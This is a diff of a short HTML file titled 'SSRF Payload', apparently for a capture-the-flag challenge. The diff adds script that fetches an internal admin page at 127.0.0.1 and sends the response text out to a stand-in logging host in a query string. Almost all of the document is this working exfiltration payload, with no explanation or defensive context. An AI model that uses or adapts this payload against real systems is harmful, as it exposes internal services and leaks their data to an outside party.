@@ -4,10 +4,14 @@
     <title>SSRF Payload</title>
 </head>
 <body>
-    <h1>Loading...</h1>
-    <img src="http://127.0.0.1/admin" alt="Flag">
+    <h1>Fetching Data...</h1>
     <script>
-        fetch('http://127.0.0.1/flag').then(response => console.log(response));
+        fetch('http://127.0.0.1/admin')
+            .then(response => response.text())
+            .then(data => {
+                // Send the fetched data back to your server
+                fetch('https://your-logging-service.com/log?data=' + encodeURIComponent(data));
+            });
     </script>
 </body>
 </html>
